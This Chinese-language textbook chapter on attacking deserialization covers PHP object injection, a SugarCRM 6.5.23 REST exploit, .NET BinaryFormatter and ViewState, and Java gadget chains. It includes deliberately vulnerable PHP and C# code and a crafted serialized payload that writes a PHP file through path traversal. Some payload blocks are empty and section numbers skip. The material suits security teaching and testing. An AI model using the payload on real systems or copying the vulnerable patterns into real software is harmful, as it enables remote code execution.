# 第 10 章 攻击序列化

## 10.1 序列化简介

序列化是将对象转换为字节的过程，而反序列化则是将字节转换回对象的过程。为了理解序列化的概念，我们来看下面的例子：

假设您在玩“使命召唤”这款流行的第一人称射击游戏的战役模式。在游戏中，您的角色拥有各种属性，如生命值、弹药数量、装备和进度等级。所有这些属性都是游戏编程上下文中对象的一部分。当您玩游戏时，此对象驻留在游戏设备的随机存取存储器（RAM）中。

如果您决定休息一下，稍后继续游戏，您需要保存当前的游戏状态。如果游戏只将进度保存在 RAM 中，那么一旦断电，所有进度都会丢失，因为 RAM 是易失性存储器。为了防止这种情况，游戏使用了序列化。

在序列化过程中，游戏将这些带有属性的对象转换并存储到非易失性存储器（如硬盘）中。当用户决定继续战役时，游戏执行反序列化。

序列化不仅限于游戏，它也适用于 Web 应用程序。Web 应用程序使用序列化来管理复杂的 Cookie 和会话信息。序列化对象在所有面向对象编程（OOP）语言中都很常见，如 PHP、Java、.Net、Python、Ruby 等。每种语言都提供了用于序列化和反序列化数据的专有函数或方法。我们将在后面详细介绍。

必须提到的是，序列化数据默认情况下未加密，也不具备防篡改能力，因此对象可能被操纵，从而导致非预期的后果。

### 10.1.1 Gadget 的概念

在序列化上下文中，“gadget” 指应用程序中现有的代码，攻击者可以在反序列化对象时利用这些代码执行非预期的操作。对于熟悉内存破坏漏洞领域的人来说，gadget 的概念类似于面向返回编程（ROP）中使用的“ROP gadget”，攻击者利用现有代码序列绕过 DEP（数据执行保护）等安全措施，并利用缓冲区溢出等漏洞。DEP 旨在阻止代码在内存的某些区域（如栈）执行，以防止缓冲区溢出等攻击。

在序列化的情况下，如果应用程序反序列化不受信任的数据，攻击者可以在序列化数据中包含对这些“gadget”的引用。当应用程序反序列化这些数据时，可能会无意中执行这些 gadget 中的代码，从而导致信息泄露和远程代码执行。

值得提及的是，gadget 本身并不恶意；它们是代码库中的合法部分。如果攻击者控制了序列化输入，他们可以串联这些 gadget，在反序列化时执行开发人员未曾预料的操作。

## 10.2 不安全的反序列化/PHP 对象注入

PHP 使用 `serialize()` 和 `unserialize()` 函数将对象转换为可存储的格式（如平面文件、数据库等），反之亦然。在 PHP 中，不安全的反序列化通常被称为对象注入。在 PHP 的上下文中，它允许对象在脚本之外以平面文件数据库的形式表示。PHP 手册明确警告开发人员，在未采取适当控制措施的情况下，不要反序列化来自不受信任来源的数据。

**图 10.1 PHP 关于 unserialize 函数的警告**

为了更好地理解这一点，让我们看一下 PHP 中“使命召唤”游戏对象的当前状态表示。代码定义了一个名为 `CallOfDutyGame` 的类，该类包含玩家游戏状态的属性，如弹药、生命值等，然后输出游戏状态对象的序列化表示，以便存储在硬盘上。

**代码**
```php
<?php
class CallOfDutyGame {
    public $playerName = 'tmgm';
    public $health = 100;
    public $ammo = 200;
    public $level = 'Level10';
    public $progress = 'Checkpoint1';
}

// 创建一个新的 CallOfDutyGame 对象
$codGame = new CallOfDutyGame();
// 序列化对象
$serializedCodGame = serialize($codGame);
// 输出序列化字符串
echo $serializedCodGame;
?>
```

执行此 PHP 脚本后，输出如下所示：

**示例**
```
O:14:"CallOfDutyGame":5:{s:10:"playerName";s:4:"tmgm";s:6:"health";i:100;s:4:"ammo";i:200;s:5:"level";s:7:"Level10";s:8:"progress";s:10:"Checkpoint1";}
```

以下是输出字符串的分解：

| 序列化部分 | 解释 |
|-----------|------|
| `O:14:"CallOfDutyGame":5:` | 表示类名“CallOfDutyGame”长度为 14 个字符（由 `O:14` 表示），总共有 5 个属性。 |
| `s:10:"playerName";` | 属性“playerName”是一个字符串，长度为 10，表示为 `s:10`。 |
| `s:4:"tmgm";` | “playerName”的值，一个包含 4 个字符的字符串。 |
| `s:6:"health";i:100;` | 属性“health”长度为 6，表示为 `s:6`，值为 100，整数，表示为 `i:100`。 |
| `s:4:"ammo";i:200;` | 属性名称为“ammo”，字符串长度为 4，值为 200。 |
| `s:5:"level";s:7:"Level10";` | 属性名称为“level”，值为字符串“Level10”。 |
| `s:8:"progress";s:10:"Checkpoint1";` | 属性名称为“progress”，值为“Checkpoint1”。 |

### 10.2.1 PHP 魔术方法

PHP 对象注入的利用取决于这些魔术方法在代码中的使用方式。它们被称为“魔术方法”，是因为它们不是显式调用的，而是针对某些事件自动触发的。例如，当使用 `unserialize()` 反序列化对象时，会执行 `__wakeup()` 方法；而 `__destruct()` 方法则在对象即将被垃圾回收器移除时触发（因为没有引用指向该对象）。魔术方法以双下划线定义。PHP 文档包含所有魔术方法的非详尽列表 [www.php.net/manual/en/language.oop5.magic.php]。

### 10.2.2 PHP 对象注入——示例

为了演示该漏洞，考虑以下代码，它通过 `filename` 和 `fileData` 参数接受输入，然后使用 `FileCreator` 类来处理这些输入。该代码将提供的 `filename` 作为要创建的文件名，将 `fileData` 作为该文件的内容。内容（来自 `fileData`）首先传递给 `unserialize()` 函数，然后使用 `file_put_contents()` 写入指定文件。

**代码**
```php
<?php
class FileCreator
{
    private $filename;
    private $fileData;

    public function __construct($filename, $fileData)
    {
        $this->filename = $filename;
        $this->fileData = $fileData;
        $unserializedData = unserialize($this->fileData);
        file_put_contents($this->filename, $unserializedData);
        echo "File created: $this->filename";
    }
}

// 检查是否提供了 filename 和 fileData
if (isset($_GET['filename']) && isset($_GET['fileData'])) {
    $filename = $_GET['filename'];
    $fileData = $_GET['fileData'];
    // 创建一个 FileCreator 对象
    $fileCreator = new FileCreator($filename, $fileData);
}
?>
```

此外，该代码并未将 `filename` 限制为白名单中的安全文件类型，这带来了潜在的安全风险。然而，更严重的漏洞在于，代码在反序列化之前并未对 `filedata` 输入进行清理，从而导致 PHP 对象注入。由于输入必须是序列化对象，我们必须以序列化输入的形式发送对象。为此，我们将操纵 `filename` 参数（其中将包含文件名 `data.php`）和内容（即我们的 PHP 后门，通过 CMD 参数执行系统命令）。

`FileCreator` 类中的 `__construct()` 方法在每次从该类创建新对象时（当然也就是文件上传时）被调用，从而导致了潜在恶意输入的反序列化。

**有效载荷**
```

```

**图 10.2 恶意 data.php 已上传**

文件上传后，我们将使用 `cmd` 参数执行任意系统命令：

**POC**
```

```

值得注意的是，能够生成序列化有效载荷是因为我们能够访问源代码，从而了解了序列化数据是如何处理的。漏洞产生的原因是 `unserialize()` 函数在 `__construct()` 方法中被调用。这意味着一旦实例化 `FileCreator` 类的新对象，任何恶意数据都会立即被反序列化。在黑盒测试中，没有先验知识的情况下生成此类有效载荷具有挑战性。然而，许多基于 PHP 的内容管理系统（CMS）平台是开源的，因此其源代码易于获取和分析。

### 10.2.3 SugarCRM 中的 PHP 对象注入

现在让我们考虑一个 SugarCRM 6.5.23 版本的真实示例，该版本存在 PHP 对象注入漏洞。该漏洞存在于 REST API 端点中，一旦被利用，攻击者可以执行任意 PHP 代码。让我们检查位于 `service/core/REST/SugarRestSerialize.php` 下的易受攻击代码。

**SugarCRM 中的易受攻击代码**
```php
function serve() {
    $GLOBALS['log']->info('Begin: SugarRestSerialize->serve');
    $data = !empty($_REQUEST['rest_data']) ? $_REQUEST['rest_data'] : "";
    if(empty($_REQUEST['method']) || !method_exists($this->implementation, $_REQUEST['method'])) {
        $er = new SoapError();
        $er->set_error('invalid_call');
        $this->fault($er);
    } else {
        $method = $_REQUEST['method'];
        $data = unserialize(from_html($data)); // 易受攻击的行
        if(!is_array($data)) $data = array($data);
        $GLOBALS['log']->info('End: SugarRestSerialize->serve');
        return call_user_func_array(array($this->implementation, $method), $data);
    }
}
```

SugarCRM 中的漏洞在用户提供的输入被传递给 `rest_data` 参数，随后赋值给 `$data` 变量时触发。如果 `input_type` 参数设置为 `serialize`，则该变量随后传递给 `unserialize()` 函数。

为了进行利用，`method` 参数必须被赋值为一个有效的 API 方法，端点将执行该方法，例如 `login`。这些有关有效方法和参数的信息（包括 `input_type` 和 `rest_data`）已从 SugarCRM API 文档中获得 [https://docs.suitecrm.com/developer/api/api-4_1/]。

### 10.2.5 寻找魔术方法

我们的下一步是找到一个合适的魔术方法。`SugarCacheFile` 类具有一个 `__destruct()` 方法，如果 `_cacheChanged` 属性为 true，该方法会将数据写入文件。当该类的对象被销毁时（通常在执行结束时），会自动调用此方法。

**代码**
```php
public function __destruct()
{
    parent::__destruct();
    if ($this->_cacheChanged)
        sugar_file_put_contents(sugar_cached($this->_cacheFileName), serialize($this->_localStore));
}
```

目标是构造一个序列化对象，当反序列化时，会构建一个 `SugarCacheFile` 对象，其属性能够欺骗 `__destruct()` 方法实现任意文件写入。让我们进一步剖析 `__destruct` 方法：

- `__destruct` 方法负责写入由 `_cacheFileName` 属性命名的文件。
- 仅当 `_cacheChanged` 为 true 时才执行写入操作。
- 写入的内容是 `_localStore` 的序列化版本。

基于这些信息，可以合理地假设 `_cacheFileName` 将包含文件名及路径，如 `../custom/tmgm.php`，而 `localStore` 将包含我们的有效载荷，即 `<?PHP phpinfo();?>`，该内容将被写入文件。因此，当对象被销毁时，如果 `_cacheChanged` 为 true，`__destruct` 方法会将 `_localStore` 的内容写入 `_cacheFileName` 指定的文件。

基于此，我们的序列化有效载荷如下所示：

**有效载荷**
```

    s:17:"\00*\00_cacheFileName";s:17:"../custom/tmgm.php";
    s:16:"\00*\00_cacheChanged";b:1;
    s:14:"\00*\00_localStore";s:19:"<?php phpinfo();?>";
}
```

有效载荷的分解：

- `O:14:"SugarCacheFile":3:`——指定一个对象，类名为 `SugarCacheFile`，后跟 3 个属性。
- `s:17:"\00*\00_cacheFileName";s:17:"../custom/tmgm.php";`——属性设置为字符串，路径为 `../custom/tmgm.php`。
- `s:16:"\00*\00_cacheChanged";b:1;`——属性 `_cacheChanged` 是布尔类型，设置为 true。
- `s:14:"\00*\00_localStore";s:19:"<?php phpinfo();?>";`——属性 `_localStore` 是一个长度为 19 的字符串，包含我们的 PHP 有效载荷，该载荷将被上传。

## 10.3 不安全的反序列化——.NET

与使用通用 `serialize()` 和 `unserialize()` 函数的 PHP 不同，.NET 支持多种序列化格式和方法，每种都适用于不同的用例：

- **二进制序列化**：包括 BinaryFormatter 等序列化方法，将对象转换为二进制格式。
- **XML 序列化**：包括 XmlSerializer 方法，用于将对象序列化为 XML 格式。
- **数据协定序列化**：包括 `DataContractSerializer` 等方法，用于将数据序列化和反序列化为 XML 或 JSON。

为了演示此漏洞，我们将重点关注“BinaryFormatter”，这是一种自 .NET 早期版本就存在的序列化方法。虽然 BinaryFormatter 因其紧凑的二进制格式在存储或传输数据方面效率较高，但由于安全问题已被标记为过时。

考虑以下 C# 命令行代码，该代码容易受到不安全的反序列化攻击。该代码执行以下步骤：

1. 应用程序提示用户通过控制台输入 base64 编码的数据。
2. 然后将此数据从 base64 解码为包含序列化对象的字节数组。
3. 接下来，使用 `BinaryFormatter` 将字节数组反序列化回 `Person` 对象，随后执行该对象的 `Greet` 方法。
4. `Person` 类实现了 `IDeserializationCallback` 接口，在反序列化完成后触发 `OnDeserialization` 方法。

**易受攻击的代码**
```csharp
using System;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;

class Program
{
    static void Main(string[] args)
    {
        AppContext.SetSwitch("Switch.System.Runtime.Serialization.SerializationGuard.AllowProcessCreation", true);

        // 接受 base64 编码数据的输入
        Console.WriteLine("Enter the base64 encoded data:");
        string base64EncodedData = Console.ReadLine();

        // 解码 base64 编码的数据
        byte[] serializedData = Convert.FromBase64String(base64EncodedData);

        // 反序列化对象
        var formatter = new BinaryFormatter();
        using (var stream = new MemoryStream(serializedData))
        {
            var deserializedPerson = (Person)formatter.Deserialize(stream);
            // 在反序列化的 person 对象上调用 Greet 方法
            deserializedPerson.Greet();
        }
        Console.ReadLine();
    }
}
```

**Person 类代码：**
```csharp
public class Person : IDeserializationCallback
{
    public string Name { get; set; }
    public int Age { get; set; }

    public void Greet()
    {
        Console.WriteLine("Hello, " + Name + "!"); // 用户可控输入
    }

    public void OnDeserialization(Object sender)
    {
        Process.Start(new ProcessStartInfo(Name)); // 危险方法
    }
}
```

`OnDeserialization` 方法充当 gadget 属性，在反序列化时自动执行。因此，整个场景的利用基于 `OnDeserialization` gadget 的逻辑。在本例中，通过用户提供的 `name` 参数生成进程。

**数据的序列化**
```csharp
class Program
{
    static void Main(string[] args)
    {
        AppContext.SetSwitch("Switch.System.Runtime.Serialization.SerializationGuard.AllowProcessCreation", true);

        var payload = new Person(); // 创建有效载荷对象
        Console.Write("Enter the name: "); // 从用户获取输入
        payload.Name = Console.ReadLine();
        Console.Write("Enter the age: ");
        int age;
        if (int.TryParse(Console.ReadLine(), out age)) {
            payload.Age = age;
        } else {
            Console.WriteLine("Invalid age. Using default value.");
            payload.Age = 0;
        }

        // 序列化对象
        var formatter = new BinaryFormatter();
        var stream = new MemoryStream();
        formatter.Serialize(stream, payload);
        stream.Seek(0, SeekOrigin.Begin);

        // 获取序列化数据
        byte[] serializedData = stream.ToArray();
        string base64EncodedData = Convert.ToBase64String(serializedData);

        // 显示 base64 编码的数据
        Console.WriteLine("\nBase64 Encoded Data:");
        Console.WriteLine(base64EncodedData);
        Console.ReadLine();
    }
}
```

### 10.3.2 ASP.NET ViewState 不安全的反序列化

ASP.NET ViewState 是一种客户端状态管理功能，广泛用于 .NET Web 应用程序中。它保留网页的状态，对于多步骤表单（如电子商务结账过程）特别有用。ViewState 有助于在页面导航期间维护用户输入的数据，而无需持久化到数据库，从而提高性能和用户体验。

ViewState 数据以 base64 编码，并通过名为 `__VIEWSTATE` 的隐藏输入字段传输。回发时，ASP.NET 框架反序列化 ViewState 以重建页面及其控件的状态。如果此反序列化过程未安全处理，则可能使应用程序面临不安全的反序列化攻击，在缺少完整性检查以防止篡改的情况下，可能允许攻击者在服务器上执行任意代码。

### 10.3.3 MAC 验证和加密

ASP.NET 采用 MAC（消息认证码）来确保 `VIEWSTATE` 参数在过程中未被篡改。这是通过将客户端提供的 MAC 与回发时计算的哈希进行比较来实现的。这可以防止恶意用户篡改 VIEWSTATE；但用户仍有可能解密其内容，从而导致机密性受损。为了防止这种情况，VIEWSTATE 可以使用 `machineKey` 进行加密。这些密钥可以存储在 `web.config` 或 `machine.config` 文件中。

如果 MAC 验证被禁用，或者验证密钥和解密密钥都被泄露，则可能存在 ViewState 篡改的风险。这可能允许攻击者注入一个精心制作的 ViewState，如果服务器不安全地反序列化，则可能导致任意代码执行。

像 YSOSERIAL.NET 这样的工具可以通过利用不安全的反序列化漏洞来帮助创建此类有效载荷。必须提到的是，可能可以通过其他漏洞（如目录遍历、本地文件包含（LFI）、XML 外部实体注入（XXE）或甚至暴力破解密钥）来获取密钥。

例如，`web.config` 文件中的 `machineKey` 部分可能如下所示：

**Web.Config 配置**
```xml
<configuration>
    <system.web>
        <machineKey
            validationKey="30D9001AE4B8102D87EB0E2E8E9D4A4A54D93E897C3E3F5B6162C6FEBF91932B"
            decryptionKey="A8B675A8D3F57DA882FDB3E3B16C3B233A966A2C"
            validation="HMACSHA256"
            decryption="AES" />
    </system.web>
</configuration>
```

`validationKey` 用于创建 MAC，而 `decryptionKey` 用于加密/解密数据。

## 10.6 不安全的反序列化——Java

在 Java 中，与 .NET 类似，有几个函数可用于执行序列化/反序列化。Java 为此提供了三大类别。

- **基本序列化**：用于将 Java 对象转换为序列化等效项，通常用于通过网络发送文件。`readObject()` 和 `writeObject()` 方法分别用于反序列化和序列化。
- **XML 序列化**：涉及将这些对象转换为相应的 XML 格式。这可以使用 XMLEncoder 和 XMLDecoder 实现。第三方库（如 XStream 和 Castor）也有助于 XML 序列化。
- **JSON 序列化**：JSON 序列化涉及将 Java 对象转换为相应的 JSON 格式；这通常用于 RESTful API。一些广泛使用的库包括 Jackson、Gson、FastJson 等。

与 .NET 类似，如果用户提供的输入在未充分检查的情况下被反序列化，Java 应用程序也容易受到不安全的反序列化攻击。攻击者可以利用这一点执行任意代码。为了安全地进行反序列化，Java 虚拟机（JVM）必须能够访问适当的类定义，这些定义位于类路径上。类路径告诉 JVM 在哪里找到所需的类，因此它必须包含所有必要的类文件和包。

### 10.6.1 Java 中的 Gadget 库

在 Java 上下文中，“gadget 库”指的是类的集合。虽然它们具有合法用途，但在序列化和反序列化过程中可能被滥用或利用。这些库通常包含各种应用程序加载的类，当它们位于应用程序的类路径上时，攻击者可以利用它们。

在反序列化过程中，Java 重建对象时需要序列化对象的类定义。如果反序列化代码的类路径包含所有必需的类，则会继续反序列化对象。如果类路径包含 gadget 库（其中包含在反序列化时执行危险操作的类），则此行为可能变得不安全，从而可能导致远程代码执行、权限提升等。了解到这一点，攻击者可以构造序列化数据，在反序列化时利用这些 gadget 执行恶意有效载荷。

多年来，研究人员已经识别出多个此类危险库，其中 Apache Commons Collections 库 1 至 6 版本是显著的例子。一个名为 `ysoserial` 的工具已被开发出来，用于演示这些漏洞的利用。它提供了利用这些库中的 gadget 在反序列化过程中执行任意代码的有效载荷。

### 10.6.7 Java 应用程序的黑盒审查

在通过分析网络流量进行渗透测试时，某些指标可能表明 Java Web 应用程序中使用了序列化对象。以下是一些指标：

- **查找十六进制序列**：检查十六进制序列 `AC ED 00 05`。
- **搜索 Base64 数据**：识别以 `rO0` 开头的 base64 数据。
- **查找完全限定类名**：查找数据中的完全限定类名，包括包名和类名。例如，您可能会在日志中遇到类似 `com.example.projectname.model.UserDetails` 的字符串，其中 `com.example.projectname.model` 是包名，`UserDetails` 是类名。
- **Content-Type**：您可能会遇到响应头设置为 `application/x-java-serialized-object`，表示序列化对象数据。

### 10.6.8 Java 框架和库的指示符

类似地，某些指示符也可能表明使用了某些框架和字符串：

- **Spring 框架指示符**：搜索以 `org.springframework` 或 `org.springframework.core` 开头的字符串，以检测 Spring 的序列化机制。
- **Apache Commons Collections 使用**：查找类似 `org.apache.commons.collections.functors` 的字符串，这表示使用了 Apache Commons Collections，该库常在 ysoserial 有效载荷中被利用。
- **JBoss 库参与**：识别以 `org.jboss.` 开头的字符串，表明序列化中使用了 JBoss 库。
- **Java 原生类型序列化**：搜索序列化的标准 Java 类型，表现为类似 `java.util.HashMap` 或 `java.lang.String` 的字符串。
